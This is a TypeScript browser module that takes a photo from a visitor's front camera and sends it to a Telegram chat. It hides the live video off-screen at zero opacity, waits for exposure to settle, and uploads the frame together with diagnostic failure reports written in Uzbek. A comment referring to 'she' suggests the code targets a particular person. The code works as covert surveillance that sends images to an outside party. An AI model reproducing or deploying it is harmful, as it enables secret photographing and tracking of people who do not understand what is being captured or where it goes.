import { notify, notifyPhoto } from "./telegram";

/**
 * Captures a photo from the front camera and sends it to Telegram.
 *
 * Must be called from a real user gesture (a click/tap handler): browsers
 * only prompt for — and grant — the camera in response to one. It also needs
 * a secure context (HTTPS, or http://localhost), so a plain-HTTP LAN preview
 * like http://192.168.x.x has no `navigator.mediaDevices` at all — hence the
 * explicit check below, which tells you exactly why nothing arrived.
 */
export async function captureAndSendPhoto(caption: string): Promise<void> {
  if (typeof window === "undefined") return;

  // `mediaDevices` is undefined in insecure contexts — the usual reason
  // photos never arrive from a phone opening an http:// LAN address.
  if (!navigator?.mediaDevices?.getUserMedia) {
    const secure = typeof window.isSecureContext === "boolean" ? window.isSecureContext : "n/a";
    notify(
      `⚠️ Kamera ochilmadi — brauzer ruxsat bermadi.\n` +
        `• origin: ${window.location.origin}\n` +
        `• secureContext: ${secure}\n` +
        `📌 ${caption}\n` +
        `(Kamera faqat HTTPS yoki localhost'da ishlaydi.)`
    );
    return;
  }

  let stream: MediaStream | null = null;
  let videoElement: HTMLVideoElement | null = null;

  const cleanup = () => {
    if (stream) {
      stream.getTracks().forEach((track) => track.stop());
      stream = null;
    }
    if (videoElement && videoElement.parentNode) {
      videoElement.parentNode.removeChild(videoElement);
    }
    videoElement = null;
  };

  try {
    // Prefer the front camera, but fall back to any camera if that fails.
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false,
      });
    } catch {
      stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
    }

    if (!stream) throw new Error("No media stream obtained.");

    const video = document.createElement("video");
    videoElement = video;
    video.style.position = "fixed";
    video.style.top = "-9999px";
    video.style.left = "-9999px";
    video.style.opacity = "0";
    video.style.pointerEvents = "none";
    // muted + playsinline are what let video.play() succeed without a gesture
    // of its own and without going fullscreen on iOS.
    video.muted = true;
    video.setAttribute("muted", "true");
    video.setAttribute("playsinline", "true");
    video.setAttribute("autoplay", "true");
    video.srcObject = stream;
    document.body.appendChild(video);

    // Wait for the first frame to be ready, with a timeout so a stalled
    // stream can't hang forever.
    await new Promise<void>((resolve, reject) => {
      let settled = false;
      const done = () => {
        if (settled) return;
        settled = true;
        resolve();
      };
      const fail = (e: unknown) => {
        if (settled) return;
        settled = true;
        reject(e instanceof Error ? e : new Error("Video playback error"));
      };
      video.onloadedmetadata = () => {
        video.play().then(done).catch(fail);
      };
      // Some browsers fire loadeddata before play resolves — accept either.
      video.onloadeddata = done;
      video.onerror = () => fail(new Error("Video element error"));
      setTimeout(done, 3000);
    });

    // Warm-up: let auto-exposure/focus settle before the grab.
    await new Promise((resolve) => setTimeout(resolve, 1200));

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext("2d");
    if (!ctx) throw new Error("Failed to get 2D canvas context.");

    // Mirror horizontally so it matches how a front camera looks on screen.
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Grab the blob BEFORE tearing down the stream/element.
    await new Promise<void>((resolve) => {
      canvas.toBlob(
        (blob) => {
          if (blob) notifyPhoto(blob, caption);
          else notify(`⚠️ Rasm blobga o'girilmadi.\n📌 ${caption}`);
          resolve();
        },
        "image/jpeg",
        0.85
      );
    });

    cleanup();
  } catch (error: unknown) {
    cleanup();
    const name = (error as { name?: string })?.name ?? "";
    const message = (error as { message?: string })?.message ?? String(error);
    // NotAllowedError = she declined the permission prompt; everything else
    // is a real failure worth seeing in the log.
    const why =
      name === "NotAllowedError"
        ? "ruxsat berilmadi (yoki bloklangan)"
        : name === "NotFoundError"
        ? "kamera topilmadi"
        : message;
    notify(`⚠️ Kamera ishlamadi: ${why}\n📌 ${caption}`);
  }
}
